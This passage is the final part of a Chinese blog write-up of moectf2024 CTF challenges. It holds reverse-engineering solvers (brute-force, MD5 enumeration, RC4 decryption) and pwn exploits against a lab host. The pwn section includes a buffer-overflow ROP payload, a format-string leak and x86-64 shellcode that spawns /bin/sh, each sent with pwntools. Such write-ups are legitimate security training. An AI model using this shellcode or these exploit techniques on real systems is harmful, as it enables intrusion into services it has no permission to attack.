<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* arr)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">33</span>; j &lt;= <span class="hljs-number">126</span>; j++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">33</span>; k &lt;= <span class="hljs-number">126</span>; k++)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-number">33</span>; l &lt;= <span class="hljs-number">126</span>; l++)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">33</span>; m &lt;= <span class="hljs-number">126</span>; m++) &#123;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp[] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)k, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)l, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)m &#125;;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)temp;<br>                    <span class="hljs-keyword">if</span> (((*p * <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>) == arr[i]) &#123;<br>                        cout &lt;&lt; (<span class="hljs-type">char</span>)j &lt;&lt; (<span class="hljs-type">char</span>)k &lt;&lt; (<span class="hljs-type">char</span>)l &lt;&lt; (<span class="hljs-type">char</span>)m;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 返回-1表示没有找到匹配的字符组合</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> arr[] = &#123;<br>        <span class="hljs-number">0xb5073388</span>, <span class="hljs-number">0xf58ea46f</span>, <span class="hljs-number">0x8cd2d760</span>, <span class="hljs-number">0x7fc56cda</span>,<br>        <span class="hljs-number">0x52bc07da</span>, <span class="hljs-number">0x29054b48</span>, <span class="hljs-number">0x42d74750</span>, <span class="hljs-number">0x11297e95</span>,<br>        <span class="hljs-number">0x5cf2821b</span>, <span class="hljs-number">0x747970da</span>, <span class="hljs-number">0x64793c81</span><br>    &#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">find</span>(i, arr) == <span class="hljs-number">-1</span>) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;No match found for arr[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="secretmodule"><a class="markdownIt-Anchor" href="#secretmodule"></a> SecretModule</h2>
<p>下载得到文件，<a target="_blank" rel="noopener" href="http://xn--customize-9q1rq60at08d.sh">打开看customize.sh</a>，提示base64，解密后下载文件，得到以下内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">testk</span></span>() &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-built_in">return</span> 1<br>  <span class="hljs-built_in">return</span> 0<br>&#125;   <br><br><span class="hljs-function"><span class="hljs-title">choose</span></span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    /system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>    <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUME &gt;/dev/null`); <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br>  <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUMEUP &gt;/dev/null`); <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-keyword">if</span> testk; <span class="hljs-keyword">then</span><br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br><span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br>concatenated=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2 3 4 5 6 7<br><span class="hljs-keyword">do</span><br>  result=$(choose)<br>  concatenated=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;concatenated&#125;</span><span class="hljs-variable">$&#123;result&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br><br>input_str=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$concatenated</span> | <span class="hljs-built_in">md5sum</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br><span class="hljs-keyword">then</span><br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;moectf&#123;<span class="hljs-variable">$concatenated</span>&#125;&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br>	<span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
<p>gpt帮帮我，写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><span class="hljs-comment"># 目标哈希值</span><br>target_hash = <span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><br><span class="hljs-comment"># 定义两个可能的结果</span><br>options = [<span class="hljs-string">&quot;114514&quot;</span>, <span class="hljs-string">&quot;1919810&quot;</span>]<br><span class="hljs-comment"># 枚举所有可能的组合，7个位置，每个位置有两个可能的选择</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(options, repeat=<span class="hljs-number">7</span>):<br>    <span class="hljs-comment"># 组合成一个字符串</span><br>    concatenated = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    <span class="hljs-comment"># 计算其 MD5 哈希值</span><br>    hashed = md5_hash(concatenated)<br><br>    <span class="hljs-comment"># 如果哈希值匹配目标</span><br>    <span class="hljs-keyword">if</span> hashed == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到匹配的输入序列: <span class="hljs-subst">&#123;combo&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入字符串: <span class="hljs-subst">&#123;concatenated&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag 是: moectf&#123;&#123;<span class="hljs-subst">&#123;concatenated&#125;</span>&#125;&#125;&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="rc4"><a class="markdownIt-Anchor" href="#rc4"></a> rc4</h2>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> longULONG;<br><span class="hljs-comment">/*初始化函数*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[i]和s[j]</span><br>        s[j] = tmp;<br>    &#125;<br>&#125; <br><span class="hljs-comment">/*加解密*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k&lt;Len; k++)<br>    &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[x]和s[y]</span><br>        s[j] = tmp;<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[]=<br>    &#123;<br>     	 <span class="hljs-number">0xA7</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0x9B</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xCE</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xD4</span>,<br>		 <span class="hljs-number">0xBC</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0x8A</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0xD6</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0xF8</span>,<span class="hljs-number">0xA4</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0xE0</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0xB9</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x11</span><br>    &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;RC4_1s_4w3s0m3&quot;</span>;<br>    <span class="hljs-type">unsigned</span>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">rc4_init</span>(s,key,<span class="hljs-number">14</span>);<br>    <span class="hljs-built_in">rc4_crypt</span>(s,flag,<span class="hljs-number">42</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">42</span>;i++)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[i]);<br>	&#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<h1 id="二进制漏洞审计"><a class="markdownIt-Anchor" href="#二进制漏洞审计"></a> 二进制漏洞审计</h1>
<h2 id="二进制漏洞审计入门指北"><a class="markdownIt-Anchor" href="#二进制漏洞审计入门指北"></a> 二进制漏洞审计入门指北</h2>
<p>nc连接一下就出来了</p>
<h2 id="notenoughtime"><a class="markdownIt-Anchor" href="#notenoughtime"></a> NotEnoughTime</h2>
<p>是个数学题，写个脚本交互一下吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>(<span class="hljs-params">io</span>):<br>    <span class="hljs-comment"># 初始交互，发送设置值</span><br>    io.recvuntil(<span class="hljs-string">b&quot;ones.&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 进入到数学表达式部分</span><br>    io.recvuntil(<span class="hljs-string">b&#x27;PREPARED!&#x27;</span>)<br>    a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 循环处理数学表达式</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 清理接收到的表达式，移除空白字符并替换除法符号</span><br>        aa = re.sub(<span class="hljs-string">r&#x27;[ \t\n\r=]+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, a.decode()).replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 计算表达式的结果</span><br>        ans = <span class="hljs-built_in">eval</span>(aa)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Calculated Answer: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 将计算结果发送回服务器</span><br>        io.sendline(<span class="hljs-built_in">str</span>(ans).encode())<br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 接收下一个表达式</span><br>            a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">except</span> EOFError:<br>            <span class="hljs-comment"># 如果没有更多表达式则跳出循环</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 连接到远程服务，端口为62593</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63631</span>)<br><br><span class="hljs-comment"># 执行工作函数</span><br>work(io)<br><br><span class="hljs-comment"># 保持交互</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="no_more_gets"><a class="markdownIt-Anchor" href="#no_more_gets"></a> no_more_gets</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">io</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;out.&#x27;</span>)  <span class="hljs-comment"># 接收直到指定字符串</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x40101a</span>) + p64(<span class="hljs-number">0x401176</span>)  <span class="hljs-comment"># 构造 payload</span><br>    io.sendline(payload)  <span class="hljs-comment"># 发送 payload</span><br><br><span class="hljs-comment"># 使用正确的 IP 地址</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63945</span>)  <span class="hljs-comment"># 建立远程连接</span><br>exp(io)  <span class="hljs-comment"># 执行 exp 函数</span><br>io.interactive()  <span class="hljs-comment"># 进入交互模式</span><br></code></pre></td></tr></table></figure>
<h2 id="leak_sth"><a class="markdownIt-Anchor" href="#leak_sth"></a> leak_sth</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;192.168.114.1&quot;</span>,<span class="hljs-number">56731</span>)<br>payload=<span class="hljs-string">b&quot;%7$p&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;Your name:\n0x&quot;</span>)<br>data=p.recv(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data=&quot;</span>,data)<br>data=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data2=&quot;</span>,<span class="hljs-built_in">hex</span>(data))<br>p.sendline(<span class="hljs-built_in">str</span>(data))<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="这是什么shellcode"><a class="markdownIt-Anchor" href="#这是什么shellcode"></a> 这是什么？shellcode！</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>,<span class="hljs-number">53436</span>)<br><br>shellcode=<span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>moectf2024</div>
      <div>https://0ran9ewww.github.io/2024/10/12/moectf/moectf2024/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>orange</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年10月12日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2024年12月4日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/10/13/%E9%A2%86%E8%88%AA%E6%9D%AF/2024%E5%B9%B4%E9%A2%86%E8%88%AA%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="2024年领航杯初赛">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2024年领航杯初赛</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/" title="ctf-sql注入">
                        <span class="hidden-mobile">ctf-sql注入</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
